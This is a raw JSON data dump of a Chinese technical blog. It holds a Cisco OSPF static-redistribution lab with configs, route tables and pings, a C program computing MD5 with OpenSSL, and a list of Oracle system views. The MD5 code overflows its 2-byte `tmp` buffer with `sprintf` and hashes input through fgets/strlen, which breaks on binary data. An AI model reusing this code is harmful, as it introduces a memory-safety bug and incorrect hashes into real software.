[110&#x2F;11] via 172.16.1.2, 00:01:12, Ethernet1&#x2F;1<br />C&amp;#160;&amp;#160;&amp;#160; 172.16.0.0&#x2F;16 is directly connected, Ethernet1&#x2F;1<br />C&amp;#160;&amp;#160;&amp;#160; 192.168.1.0&#x2F;24 is directly connected, Ethernet1&#x2F;0<br /><br /><br />R3#sh ip route<br />Codes: C - connected, S - static, I - IGRP, R - RIP, M - mobile, B - BGP<br />D - EIGRP, EX - EIGRP external, O - OSPF, IA - OSPF inter area<br />N1 - OSPF NSSA external type 1, N2 - OSPF NSSA external type 2<br />E1 - OSPF external type 1, E2 - OSPF external type 2, E - EGP<br />i - IS-IS, L1 - IS-IS level-1, L2 - IS-IS level-2, ia - IS-IS inter area<br />* - candidate default, U - per-user static route, o - ODR<br />P - periodic downloaded static route<br /><br />Gateway of last resort is not set<br /><br />1.0.0.0&#x2F;24 is subnetted, 1 subnets<br />O E2&amp;#160;&amp;#160;&amp;#160; 1.1.1.0 [110&#x2F;20] via 172.16.1.1, 00:01:19, Ethernet1&#x2F;0<br />2.0.0.0&#x2F;24 is subnetted, 1 subnets<br />C&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160; 2.2.2.0 is directly connected, Loopback0<br />3.0.0.0&#x2F;24 is subnetted, 1 subnets<br />O E2&amp;#160;&amp;#160;&amp;#160; 3.3.3.0 [110&#x2F;20] via 172.16.1.1, 00:01:19, Ethernet1&#x2F;0<br />4.0.0.0&#x2F;24 is subnetted, 1 subnets<br />C&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160; 4.4.4.0 is directly connected, Loopback2<br />C&amp;#160;&amp;#160;&amp;#160; 172.16.0.0&#x2F;16 is directly connected, Ethernet1&#x2F;0<br />O&amp;#160;&amp;#160;&amp;#160; 192.168.1.0&#x2F;24 [110&#x2F;20] via 172.16.1.1, 00:01:19, Ethernet1&#x2F;0<br /><br />测试：<br /><br /><br />R1#ping 4.4.4.4<br /><br />Type escape sequence to abort.<br />Sending 5, 100-byte ICMP Echos to 4.4.4.4, timeout is 2 seconds:<br />!!!!!<br />Success rate is 100 percent (5&#x2F;5), round-trip min&#x2F;avg&#x2F;max &#x3D; 12&#x2F;19&#x2F;28 ms<br />R1#ping 2.2.2.2<br /><br />Type escape sequence to abort.<br />Sending 5, 100-byte ICMP Echos to 2.2.2.2, timeout is 2 seconds:<br />!!!!!<br />Success rate is 100 percent (5&#x2F;5), round-trip min&#x2F;avg&#x2F;max &#x3D; 8&#x2F;15&#x2F;28 ms<br /><br /><br /><br />R3#ping 1.1.1.1<br /><br />Type escape sequence to abort.<br />Sending 5, 100-byte ICMP Echos to 1.1.1.1, timeout is 2 seconds:<br />!!!!!<br />Success rate is 100 percent (5&#x2F;5), round-trip min&#x2F;avg&#x2F;max &#x3D; 16&#x2F;20&#x2F;24 ms<br />R3#ping 3.3.3.3<br /><br />Type escape sequence to abort.<br />Sending 5, 100-byte ICMP Echos to 3.3.3.3, timeout is 2 seconds:<br />!!!!!<br />Success rate is 100 percent (5&#x2F;5), round-trip min&#x2F;avg&#x2F;max &#x3D; 12&#x2F;16&#x2F;24 ms<br /><br /><br /><br />如有转载请写明出处<a href=\"http://hi.baidu.com/key1088%E3%80%82\">http://hi.baidu.com/key1088。</a><br /><br /><br /><br /><br /><br /></p>\n","site":{"data":{}},"excerpt":"","more":"<p>拓扑图如下：<br /><br /><img src=\"/images/pic/007d91fb4e745039d9f9fdcf.jpg\" small=\"0\" /><br /><br /><br />配置如下：<br />R1#sh running-config<br />Building configuration…<br /><br />Current configuration:<br />!<br />version 12.1<br />service timestamps debug uptime<br />service timestamps log uptime<br />no service password-encryption<br />!<br />hostname R1<br />!<br />!<br />!<br />!<br />!<br />!<br />memory-size iomem 15<br />ip subnet-zero<br />!<br />!<br />!<br />!<br />interface Loopback0<br />ip address 1.1.1.1 255.255.255.0<br />!<br />interface Loopback1<br />ip address 3.3.3.3 255.255.255.0<br />!<br />interface FastEthernet0&#x2F;0<br />no ip address<br />shutdown<br />duplex auto<br />speed auto<br />!<br />interface FastEthernet0&#x2F;1<br />ip address 192.168.1.1 255.255.255.0<br />duplex auto<br />speed auto<br />!<br />router ospf 1<br />log-adjacency-changes<br />redistribute static subnets<br />!<br />ip classless<br />ip route 2.2.2.0 255.255.255.0 192.168.1.2<br />ip route 4.4.4.0 255.255.255.0 192.168.1.2<br />ip route 172.16.0.0 255.255.0.0 192.168.1.2<br />no ip http server<br />!<br />!<br />line con 0<br />transport input none<br />line aux 0<br />line vty 0 4<br />login<br />!<br />end<br /><br /><br /><br />R2#sh running-config<br />Building configuration…<br /><br />Current configuration:<br />!<br />version 12.1<br />service timestamps debug uptime<br />service timestamps log uptime<br />no service password-encryption<br />!<br />hostname R2<br />!<br />!<br />!<br />!<br />!<br />!<br />memory-size iomem 15<br />ip subnet-zero<br />!<br />!<br />!<br />!<br />interface Ethernet1&#x2F;0<br />ip address 192.168.1.2 255.255.255.0<br />!<br />interface Ethernet1&#x2F;1<br />ip address 172.16.1.1 255.255.0.0<br />!<br />interface Ethernet1&#x2F;2<br />no ip address<br />shutdown<br />!<br />interface Ethernet1&#x2F;3<br />no ip address<br />shutdown<br />!<br />router ospf 1<br />log-adjacency-changes<br />redistribute static subnets<br />network 172.16.0.0 0.0.255.255 area 0<br />network 192.168.1.0 0.0.0.255 area 0<br /><br />!<br />ip classless<br />ip route 1.1.1.0 255.255.255.0 192.168.1.1<br />ip route 3.3.3.0 255.255.255.0 192.168.1.1<br />no ip http server<br />!<br />!<br />line con 0<br />transport input none<br />line aux 0<br />line vty 0 4<br />login<br />!<br />end<br /><br /><br /><br />R3#sh running-config<br />Building configuration…<br /><br />Current configuration:<br />!<br />version 12.1<br />service timestamps debug uptime<br />service timestamps log uptime<br />no service password-encryption<br />!<br />hostname R3<br />!<br />!<br />!<br />!<br />!<br />!<br />memory-size iomem 15<br />ip subnet-zero<br />!<br />!<br />!<br />!<br />interface Loopback0<br />ip address 2.2.2.2 255.255.255.0<br />!<br />interface Loopback2<br />ip address 4.4.4.4 255.255.255.0<br />!<br />interface Ethernet1&#x2F;0<br />ip address 172.16.1.2 255.255.0.0<br />!<br />interface Ethernet1&#x2F;1<br />no ip address<br />shutdown<br />!<br />interface Ethernet1&#x2F;2<br />no ip address<br />shutdown<br />!<br />interface Ethernet1&#x2F;3<br />no ip address<br />shutdown<br />!<br />router ospf 1<br />log-adjacency-changes<br />network 2.2.2.0 0.0.0.255 area 2<br />network 4.4.4.0 0.0.0.255 area 3<br />network 172.16.0.0 0.0.255.255 area 0<br />!<br />ip classless<br />no ip http server<br />!<br />!<br />line con 0<br />transport input none<br />line aux 0<br />line vty 0 4<br />login<br />!<br />end<br /><br />路由表显示<br /><br />R1#sh ip route<br />Codes: C - connected, S - static, I - IGRP, R - RIP, M - mobile, B - BGP<br />D - EIGRP, EX - EIGRP external, O - OSPF, IA - OSPF inter area<br />N1 - OSPF NSSA external type 1, N2 - OSPF NSSA external type 2<br />E1 - OSPF external type 1, E2 - OSPF external type 2, E - EGP<br />i - IS-IS, L1 - IS-IS level-1, L2 - IS-IS level-2, ia - IS-IS inter area<br />* - candidate default, U - per-user static route, o - ODR<br />P - periodic downloaded static route<br /><br />Gateway of last resort is not set<br /><br />1.0.0.0&#x2F;24 is subnetted, 1 subnets<br />C&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160; 1.1.1.0 is directly connected, Loopback0<br />2.0.0.0&#x2F;24 is subnetted, 1 subnets<br />S&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160; 2.2.2.0 [1&#x2F;0] via 192.168.1.2<br />3.0.0.0&#x2F;24 is subnetted, 1 subnets<br />C&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160; 3.3.3.0 is directly connected, Loopback1<br />4.0.0.0&#x2F;24 is subnetted, 1 subnets<br />S&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160; 4.4.4.0 [1&#x2F;0] via 192.168.1.2<br />S&amp;#160;&amp;#160;&amp;#160; 172.16.0.0&#x2F;16 [1&#x2F;0] via 192.168.1.2<br />C&amp;#160;&amp;#160;&amp;#160; 192.168.1.0&#x2F;24 is directly connected, FastEthernet0&#x2F;1<br /><br /><br /><br />R2#sh ip route<br />Codes: C - connected, S - static, I - IGRP, R - RIP, M - mobile, B - BGP<br />D - EIGRP, EX - EIGRP external, O - OSPF, IA - OSPF inter area<br />N1 - OSPF NSSA external type 1, N2 - OSPF NSSA external type 2<br />E1 - OSPF external type 1, E2 - OSPF external type 2, E - EGP<br />i - IS-IS, L1 - IS-IS level-1, L2 - IS-IS level-2, ia - IS-IS inter area<br />* - candidate default, U - per-user static route, o - ODR<br />P - periodic downloaded static route<br /><br />Gateway of last resort is not set<br /><br />1.0.0.0&#x2F;24 is subnetted, 1 subnets<br />S&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160; 1.1.1.0 [1&#x2F;0] via 192.168.1.1<br />2.0.0.0&#x2F;32 is subnetted, 1 subnets<br />O IA&amp;#160;&amp;#160;&amp;#160; 2.2.2.2 [110&#x2F;11] via 172.16.1.2, 00:01:12, Ethernet1&#x2F;1<br />3.0.0.0&#x2F;24 is subnetted, 1 subnets<br />S&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160; 3.3.3.0 [1&#x2F;0] via 192.168.1.1<br />4.0.0.0&#x2F;32 is subnetted, 1 subnets<br />O IA&amp;#160;&amp;#160;&amp;#160; 4.4.4.4 [110&#x2F;11] via 172.16.1.2, 00:01:12, Ethernet1&#x2F;1<br />C&amp;#160;&amp;#160;&amp;#160; 172.16.0.0&#x2F;16 is directly connected, Ethernet1&#x2F;1<br />C&amp;#160;&amp;#160;&amp;#160; 192.168.1.0&#x2F;24 is directly connected, Ethernet1&#x2F;0<br /><br /><br />R3#sh ip route<br />Codes: C - connected, S - static, I - IGRP, R - RIP, M - mobile, B - BGP<br />D - EIGRP, EX - EIGRP external, O - OSPF, IA - OSPF inter area<br />N1 - OSPF NSSA external type 1, N2 - OSPF NSSA external type 2<br />E1 - OSPF external type 1, E2 - OSPF external type 2, E - EGP<br />i - IS-IS, L1 - IS-IS level-1, L2 - IS-IS level-2, ia - IS-IS inter area<br />* - candidate default, U - per-user static route, o - ODR<br />P - periodic downloaded static route<br /><br />Gateway of last resort is not set<br /><br />1.0.0.0&#x2F;24 is subnetted, 1 subnets<br />O E2&amp;#160;&amp;#160;&amp;#160; 1.1.1.0 [110&#x2F;20] via 172.16.1.1, 00:01:19, Ethernet1&#x2F;0<br />2.0.0.0&#x2F;24 is subnetted, 1 subnets<br />C&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160; 2.2.2.0 is directly connected, Loopback0<br />3.0.0.0&#x2F;24 is subnetted, 1 subnets<br />O E2&amp;#160;&amp;#160;&amp;#160; 3.3.3.0 [110&#x2F;20] via 172.16.1.1, 00:01:19, Ethernet1&#x2F;0<br />4.0.0.0&#x2F;24 is subnetted, 1 subnets<br />C&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160; 4.4.4.0 is directly connected, Loopback2<br />C&amp;#160;&amp;#160;&amp;#160; 172.16.0.0&#x2F;16 is directly connected, Ethernet1&#x2F;0<br />O&amp;#160;&amp;#160;&amp;#160; 192.168.1.0&#x2F;24 [110&#x2F;20] via 172.16.1.1, 00:01:19, Ethernet1&#x2F;0<br /><br />测试：<br /><br /><br />R1#ping 4.4.4.4<br /><br />Type escape sequence to abort.<br />Sending 5, 100-byte ICMP Echos to 4.4.4.4, timeout is 2 seconds:<br />!!!!!<br />Success rate is 100 percent (5&#x2F;5), round-trip min&#x2F;avg&#x2F;max &#x3D; 12&#x2F;19&#x2F;28 ms<br />R1#ping 2.2.2.2<br /><br />Type escape sequence to abort.<br />Sending 5, 100-byte ICMP Echos to 2.2.2.2, timeout is 2 seconds:<br />!!!!!<br />Success rate is 100 percent (5&#x2F;5), round-trip min&#x2F;avg&#x2F;max &#x3D; 8&#x2F;15&#x2F;28 ms<br /><br /><br /><br />R3#ping 1.1.1.1<br /><br />Type escape sequence to abort.<br />Sending 5, 100-byte ICMP Echos to 1.1.1.1, timeout is 2 seconds:<br />!!!!!<br />Success rate is 100 percent (5&#x2F;5), round-trip min&#x2F;avg&#x2F;max &#x3D; 16&#x2F;20&#x2F;24 ms<br />R3#ping 3.3.3.3<br /><br />Type escape sequence to abort.<br />Sending 5, 100-byte ICMP Echos to 3.3.3.3, timeout is 2 seconds:<br />!!!!!<br />Success rate is 100 percent (5&#x2F;5), round-trip min&#x2F;avg&#x2F;max &#x3D; 12&#x2F;16&#x2F;24 ms<br /><br /><br /><br />如有转载请写明出处<a href=\"http://hi.baidu.com/key1088%E3%80%82\">http://hi.baidu.com/key1088。</a><br /><br /><br /><br /><br /><br /></p>\n"},{"title":"openssl API md5效验","date":"2013-05-02T15:48:31.000Z","_content":"<pre>\n#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n#include <errno.h>\n#include <openssl/md5.h>\nint main(int argc, char **argv)\n{\n    MD5_CTX ctx;\n    unsigned char md[32 + 1];\n    char    md5[32 + 1];\n    char    tmp[2];\n    char    buff[256];\n    char    *filename;\n    FILE    *fp;\n    int     i;\n    if (argc < 2) {\n        printf(\"Usage:%s <filename>n\", argv[0]);\n        exit(1);\n    }\n    filename = argv[1];\n    memset(md5, 0x00, sizeof(md5));\n    memset(md, 0x00, sizeof(md));\n    if(MD5_Init(&ctx) == 0) {\n        perror(\"MD5_Init\");\n        exit(1);\n    }\n    if((fp=fopen(filename,\"rb\")) == NULL) {\n        perror(\"fopen\");\n        exit(1);\n    }\n    while (! feof(fp) ) {\n        memset(buff, 0x00, sizeof(buff));\n        fgets(buff, 256, fp);\n        if(MD5_Update(&ctx, buff, strlen(buff)) == 0) {\n            perror(\"MD5_Update\");\n            exit(1);\n        }\n    }\n    fclose(fp);\n    if(MD5_Final(md, &ctx) == 0) {\n        perror(\"MD5_Final:\");\n        exit(1);\n    }\n        for(i=0; i< 16; i++) {\n        memset(tmp, 0x00, sizeof(tmp));\n            sprintf(tmp, \"%02X\", md[i]);\n            strcat(md5, tmp);\n    }\n    printf(\"md5(%s):%sn\", filename, md5);\n    return 0;\n}\n</pre>\n<pre>\nroot@bt:~/c# cc -o testmd5 testmd5.c -lssl\nroot@bt:~/c# ./testmd5 1.c\nmd5(1.c):1558734758F8CB08D6DB8D5B57E71BF7\nroot@bt:~/c# ./testmd5 2.c\nmd5(2.c):0C8E614EC0AB5B5CEF90D012F5C11797\nroot@bt:~/c# openssl md5 1.c\nMD5(1.c)= 1558734758f8cb08d6db8d5b57e71bf7\nroot@bt:~/c# openssl md5 2.c\nMD5(2.c)= 0c\n</pre>","source":"_posts/openssl-API-md5效验.md","raw":"title: openssl API md5效验\ncategories: [网络安全,Linux,C编程]\ntags: [MD5_CTX,openssl]\ndate: 2013-05-02 23:48:31\n---\n<pre>\n#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n#include <errno.h>\n#include <openssl/md5.h>\nint main(int argc, char **argv)\n{\n    MD5_CTX ctx;\n    unsigned char md[32 + 1];\n    char    md5[32 + 1];\n    char    tmp[2];\n    char    buff[256];\n    char    *filename;\n    FILE    *fp;\n    int     i;\n    if (argc < 2) {\n        printf(\"Usage:%s <filename>n\", argv[0]);\n        exit(1);\n    }\n    filename = argv[1];\n    memset(md5, 0x00, sizeof(md5));\n    memset(md, 0x00, sizeof(md));\n    if(MD5_Init(&ctx) == 0) {\n        perror(\"MD5_Init\");\n        exit(1);\n    }\n    if((fp=fopen(filename,\"rb\")) == NULL) {\n        perror(\"fopen\");\n        exit(1);\n    }\n    while (! feof(fp) ) {\n        memset(buff, 0x00, sizeof(buff));\n        fgets(buff, 256, fp);\n        if(MD5_Update(&ctx, buff, strlen(buff)) == 0) {\n            perror(\"MD5_Update\");\n            exit(1);\n        }\n    }\n    fclose(fp);\n    if(MD5_Final(md, &ctx) == 0) {\n        perror(\"MD5_Final:\");\n        exit(1);\n    }\n        for(i=0; i< 16; i++) {\n        memset(tmp, 0x00, sizeof(tmp));\n            sprintf(tmp, \"%02X\", md[i]);\n            strcat(md5, tmp);\n    }\n    printf(\"md5(%s):%sn\", filename, md5);\n    return 0;\n}\n</pre>\n<pre>\nroot@bt:~/c# cc -o testmd5 testmd5.c -lssl\nroot@bt:~/c# ./testmd5 1.c\nmd5(1.c):1558734758F8CB08D6DB8D5B57E71BF7\nroot@bt:~/c# ./testmd5 2.c\nmd5(2.c):0C8E614EC0AB5B5CEF90D012F5C11797\nroot@bt:~/c# openssl md5 1.c\nMD5(1.c)= 1558734758f8cb08d6db8d5b57e71bf7\nroot@bt:~/c# openssl md5 2.c\nMD5(2.c)= 0c\n</pre>","slug":"openssl-API-md5效验","published":1,"updated":"2023-04-22T05:38:44.860Z","_id":"clgrjlxii005f7opifu014mwv","comments":1,"layout":"post","photos":[],"link":"","content":"<pre>\n#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n#include <errno.h>\n#include <openssl/md5.h>\nint main(int argc, char **argv)\n{\n    MD5_CTX ctx;\n    unsigned char md[32 + 1];\n    char    md5[32 + 1];\n    char    tmp[2];\n    char    buff[256];\n    char    *filename;\n    FILE    *fp;\n    int     i;\n    if (argc < 2) {\n        printf(\"Usage:%s <filename>n\", argv[0]);\n        exit(1);\n    }\n    filename = argv[1];\n    memset(md5, 0x00, sizeof(md5));\n    memset(md, 0x00, sizeof(md));\n    if(MD5_Init(&ctx) == 0) {\n        perror(\"MD5_Init\");\n        exit(1);\n    }\n    if((fp=fopen(filename,\"rb\")) == NULL) {\n        perror(\"fopen\");\n        exit(1);\n    }\n    while (! feof(fp) ) {\n        memset(buff, 0x00, sizeof(buff));\n        fgets(buff, 256, fp);\n        if(MD5_Update(&ctx, buff, strlen(buff)) == 0) {\n            perror(\"MD5_Update\");\n            exit(1);\n        }\n    }\n    fclose(fp);\n    if(MD5_Final(md, &ctx) == 0) {\n        perror(\"MD5_Final:\");\n        exit(1);\n    }\n        for(i=0; i< 16; i++) {\n        memset(tmp, 0x00, sizeof(tmp));\n            sprintf(tmp, \"%02X\", md[i]);\n            strcat(md5, tmp);\n    }\n    printf(\"md5(%s):%sn\", filename, md5);\n    return 0;\n}\n</pre>\n<pre>\nroot@bt:~/c# cc -o testmd5 testmd5.c -lssl\nroot@bt:~/c# ./testmd5 1.c\nmd5(1.c):1558734758F8CB08D6DB8D5B57E71BF7\nroot@bt:~/c# ./testmd5 2.c\nmd5(2.c):0C8E614EC0AB5B5CEF90D012F5C11797\nroot@bt:~/c# openssl md5 1.c\nMD5(1.c)= 1558734758f8cb08d6db8d5b57e71bf7\nroot@bt:~/c# openssl md5 2.c\nMD5(2.c)= 0c\n</pre>","site":{"data":{}},"excerpt":"","more":"<pre>\n#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n#include <errno.h>\n#include <openssl/md5.h>\nint main(int argc, char **argv)\n{\n    MD5_CTX ctx;\n    unsigned char md[32 + 1];\n    char    md5[32 + 1];\n    char    tmp[2];\n    char    buff[256];\n    char    *filename;\n    FILE    *fp;\n    int     i;\n    if (argc < 2) {\n        printf(\"Usage:%s <filename>n\", argv[0]);\n        exit(1);\n    }\n    filename = argv[1];\n    memset(md5, 0x00, sizeof(md5));\n    memset(md, 0x00, sizeof(md));\n    if(MD5_Init(&ctx) == 0) {\n        perror(\"MD5_Init\");\n        exit(1);\n    }\n    if((fp=fopen(filename,\"rb\")) == NULL) {\n        perror(\"fopen\");\n        exit(1);\n    }\n    while (! feof(fp) ) {\n        memset(buff, 0x00, sizeof(buff));\n        fgets(buff, 256, fp);\n        if(MD5_Update(&ctx, buff, strlen(buff)) == 0) {\n            perror(\"MD5_Update\");\n            exit(1);\n        }\n    }\n    fclose(fp);\n    if(MD5_Final(md, &ctx) == 0) {\n        perror(\"MD5_Final:\");\n        exit(1);\n    }\n        for(i=0; i< 16; i++) {\n        memset(tmp, 0x00, sizeof(tmp));\n            sprintf(tmp, \"%02X\", md[i]);\n            strcat(md5, tmp);\n    }\n    printf(\"md5(%s):%sn\", filename, md5);\n    return 0;\n}\n</pre>\n<pre>\nroot@bt:~/c# cc -o testmd5 testmd5.c -lssl\nroot@bt:~/c# ./testmd5 1.c\nmd5(1.c):1558734758F8CB08D6DB8D5B57E71BF7\nroot@bt:~/c# ./testmd5 2.c\nmd5(2.c):0C8E614EC0AB5B5CEF90D012F5C11797\nroot@bt:~/c# openssl md5 1.c\nMD5(1.c)= 1558734758f8cb08d6db8d5b57e71bf7\nroot@bt:~/c# openssl md5 2.c\nMD5(2.c)= 0c\n</pre>"},{"title":"oracle 一些系统表","date":"2012-03-02T08:22:00.000Z","_content":"dba_开头 <br />dba_users&nbsp;&nbsp;&nbsp; 数据库用户信息&nbsp; &nbsp;<br />dba_segments 表段信息&nbsp; &nbsp;<br />dba_extents&nbsp;&nbsp; 数据区信息&nbsp; &nbsp;<br />dba_objects&nbsp;&nbsp; 数据库对象信息&nbsp; &nbsp;<br />dba_tablespaces&nbsp; 数据库表空间信息&nbsp; &nbsp;<br />dba_data_files&nbsp;&nbsp; 数据文件设置信息&nbsp; &nbsp;<br />dba_temp_files&nbsp; 临时数据文件信息&nbsp; &nbsp;<br />dba_rollback_segs&nbsp; 回滚段信息&nbsp; &nbsp;<br />dba_ts_quotas&nbsp; 用户表空间配额信息&nbsp; &nbsp;<br />dba_free_space数据库空闲空间信息&nbsp; &nbsp;<br />dba_profiles&nbsp; 数据库用户资源限制信息&nbsp; &nbsp;<br />dba_sys_privs&nbsp; 用户的系统权限信息&nbsp; &nbsp;<br />dba_tab_privs用户具有的对象权限信息&nbsp; &nbsp;<br />dba_col_privs用户具有的列对象权限信息&nbsp; &nbsp;<br />dba_role_privs用户具有的角色信息&nbsp; &nbsp;<br />dba_audit_trail审计跟踪记录信息&nbsp; &nbsp;<br />dba_stmt_audit_opts审计设置信息&nbsp; &nbsp;<br />dba_audit_object&nbsp; 对象审计结果信息&nbsp; &nbsp;<br />dba_audit_session会话审计结果信息&nbsp; &nbsp;<br />dba_indexes用户模式的索引信息<br /><br />user_开头&nbsp; &nbsp;<br />user_objects&nbsp; 用户对象信息&nbsp; &nbsp;<br />user_source&nbsp; 数据库用户的所有资源对象信息&nbsp; &nbsp;<br />user_segments&nbsp; 用户的表段信息&nbsp; &nbsp;<br />user_tables&nbsp;&nbsp; 用户的表对象信息&nbsp; &nbsp;<br />user_tab_columns&nbsp; 用户的表列信息&nbsp; &nbsp;<br />user_constraints&nbsp; 用户的对象约束信息&nbsp; &nbsp;<br />user_sys_privs&nbsp; 当前用户的系统权限信息&nbsp; &nbsp;<br />user_tab_privs&nbsp; 当前用户的对象权限信息&nbsp; &nbsp;<br />user_col_privs&nbsp; 当前用户的表列权限信息&nbsp; &nbsp;<br />user_role_privs&nbsp; 当前用户的角色权限信息&nbsp; &nbsp;<br />user_indexes&nbsp; 用户的索引信息&nbsp; &nbsp;<br />user_ind_columns用户的索引对应的表列信息&nbsp; &nbsp;<br />user_cons_columns&nbsp; 用户的约束对应的表列信息&nbsp; &nbsp;<br />user_clusters&nbsp; 用户的所有簇信息&nbsp; &nbsp;<br />user_clu_columns 用户的簇所包含的内容信息 &nbsp;<br />user_cluster_hash_expressions&nbsp;&nbsp; 散列簇的信息<br />&nbsp;<br />&nbsp;v$开头 &nbsp;<br />&nbsp;v$database&nbsp;&nbsp; 数据库信息 &nbsp;<br />&nbsp;v$datafile&nbsp; 数据文件信息 &nbsp;<br />&nbsp;v$controlfile控制文件信息&nbsp; &nbsp;<br />&nbsp;v$logfile&nbsp; 重做日志信息&nbsp; &nbsp;<br />&nbsp;v$instance&nbsp; 数据库实例信息 &nbsp;<br />&nbsp;v$log&nbsp; 日志组信息&nbsp; &nbsp;<br />&nbsp;v$loghist 日志历史信息&nbsp; &nbsp;<br />&nbsp;v$sga&nbsp; 数据库SGA信息&nbsp; &nbsp;<br />&nbsp;v$parameter 初始化参数信息 &nbsp;<br />&nbsp;v$process&nbsp; 数据库服务器进程信息&nbsp; &nbsp;<br />&nbsp;v$bgprocess&nbsp; 数据库后台进程信息 &nbsp;<br />&nbsp;v$controlfile_record_section&nbsp; 控制文件记载的各部分信息 <br />&nbsp;v$thread&nbsp; 线程信息&nbsp; &nbsp;<br />&nbsp;v$datafile_header&nbsp; 数据文件头所记载的信息&nbsp; &nbsp;<br />&nbsp;v$archived_log归档日志信息 &nbsp;<br />&nbsp;v$archive_dest&nbsp; 归档日志的设置信息&nbsp; &nbsp;<br />&nbsp;v$logmnr_contents&nbsp; 归档日志分析的DML DDL结果信息&nbsp; &nbsp;<br />&nbsp;v$logmnr_dictionary&nbsp; 日志分析的字典文件信息 &nbsp;<br />&nbsp;v$logmnr_logs&nbsp; 日志分析的日志列表信息&nbsp; &nbsp;<br />&nbsp;v$tablespace&nbsp; 表空间信息 &nbsp;<br />&nbsp;v$tempfile&nbsp; 临时文件信息&nbsp; &nbsp;<br />&nbsp;v$filestat&nbsp; 数据文件的I/O统计信息&nbsp; &nbsp;<br />&nbsp;v$undostat&nbsp; Undo数据信息&nbsp; &nbsp;<br />&nbsp;v$rollname&nbsp; 在线回滚段信息 &nbsp;<br />&nbsp;v$session&nbsp; 会话信息 &nbsp;<br />&nbsp;v$transaction 事务信息&nbsp; &nbsp;<br />&nbsp;v$rollstat&nbsp;&nbsp; 回滚段统计信息&nbsp; &nbsp;<br />&nbsp;v$pwfile_users&nbsp; 特权用户信息 &nbsp;<br />&nbsp;v$sqlarea&nbsp;&nbsp;&nbsp; 当前查询过的sql语句访问过的资源及相关的信息&nbsp; &nbsp;<br />&nbsp;v$sql&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 与v$sqlarea基本相同的相关信息&nbsp; &nbsp;<br />&nbsp;v$sysstat&nbsp;&nbsp; 数据库系统状态信息<br />&nbsp;<br />&nbsp;all_开头&nbsp; &nbsp;<br />&nbsp;all_users&nbsp; 数据库所有用户的信息&nbsp; &nbsp;<br />&nbsp;all_objects&nbsp; 数据库所有的对象的信息&nbsp; &nbsp;<br />&nbsp;all_def_audit_opts&nbsp; 所有默认的审计设置信息&nbsp; &nbsp;<br />&nbsp;all_tables&nbsp; 所有的表对象信息&nbsp; &nbsp;<br />&nbsp;all_indexes所有的数据库对象索引的信息<br />&nbsp;<br />&nbsp;session_开头&nbsp; &nbsp;<br />session_roles&nbsp;&nbsp; 会话的角色信息 &nbsp;<br />&nbsp;session_privs&nbsp;&nbsp; 会话的权限信息<br />&nbsp;<br />&nbsp;index_开头&nbsp; &nbsp;<br />&nbsp;index_stats&nbsp; 索引的设置和存储信息伪表 &nbsp;<br />&nbsp;<br />&nbsp;dual&nbsp; 系统伪列表信息","source":"_posts/oracle-一些系统表.md","raw":"title: oracle 一些系统表\ncategories: [Linux]\ntags: []\ndate: 2012-03-02 16:22:00\n---\ndba_开头 <br />dba_users&nbsp;&nbsp;&nbsp; 数据库用户信息&nbsp; &nbsp;<br />dba_segments 表段信息&nbsp; &nbsp;<br />dba_extents&nbsp;&nbsp; 数据区信息&nbsp; &nbsp;<br />dba_objects&nbsp;&nbsp; 数据库对象信息&nbsp; &nbsp;<br />dba_tablespaces&nbsp; 数据库表空间信息&nbsp; &nbsp;<br />dba_data_files&nbsp;&nbsp; 数据文件设置信息&nbsp; &nbsp;<br />dba_temp_files&nbsp; 临时数据文件信息&nbsp; &nbsp;<br />dba_rollback_segs&nbsp; 回滚段信息&nbsp; &nbsp;<br />dba_ts_quotas&nbsp; 用户表空间配额信息&nbsp; &nbsp;<br />dba_free_space数据库空闲空间信息&nbsp; &nbsp;<br />dba_profiles&nbsp; 数据库用户资源限制信息&nbsp; &nbsp;<br />dba_sys_privs&nbsp; 用户的系统权限信息&nbsp; &nbsp;<br />dba_tab_privs用户具有的对象权限信息&nbsp; &nbsp;<br />dba_col_privs用户具有的列对象权限信息&nbsp; &nbsp;<br />dba_role_privs用户具有的角色信息&nbsp; &nbsp;<br />dba_audit_trail审计跟踪记录信息&nbsp; &nbsp;<br />dba_stmt_audit_opts审计设置信息&nbsp; &nbsp;<br />dba_audit_object&nbsp; 对象审计结果信息&nbsp; &nbsp;<br />dba_audit_session会话审计结果信息&nbsp; &nbsp;<br />dba_indexes用户模式的索引信息<br /><br />user_开头&nbsp; &nbsp;<br />user_objects&nbsp; 用户对象信息&nbsp; &nbsp;<br />user_source&nbsp; 数据库用户的所有资源对象信息&nbsp; &nbsp;<br />user_segments&nbsp; 用户的表段信息&nbsp; &nbsp;<br />user_tables&nbsp;&nbsp; 用户的表对象信息&nbsp; &nbsp;<br />user_tab_columns&nbsp; 用户的表列信息&nbsp; &nbsp;<br />user_constraints&nbsp; 用户的对象约束信息&nbsp; &nbsp;<br />user_sys_privs&nbsp; 当前用户的系统权限信息&nbsp; &nbsp;<br />user_tab_privs&nbsp; 当前用户的对象权限信息&nbsp; &nbsp;<br />user_col_privs&nbsp; 当前用户的表列权限信息&nbsp; &nbsp;<br />user_role_privs&nbsp; 当前用户的角色权限信息&nbsp; &nbsp;<br />user_indexes&nbsp; 用户的索引信息&nbsp; &nbsp;<br />user_ind_columns用户的索引对应的表列信息&nbsp; &nbsp;<br />user_cons_columns&nbsp; 用户的约束对应的表列信息&nbsp; &nbsp;<br />user_clusters&nbsp; 用户的所有簇信息&nbsp; &nbsp;<br />user_clu_columns 用户的簇所包含的内容信息 &nbsp;<br />user_cluster_hash_expressions&nbsp;&nbsp; 散列簇的信息<br 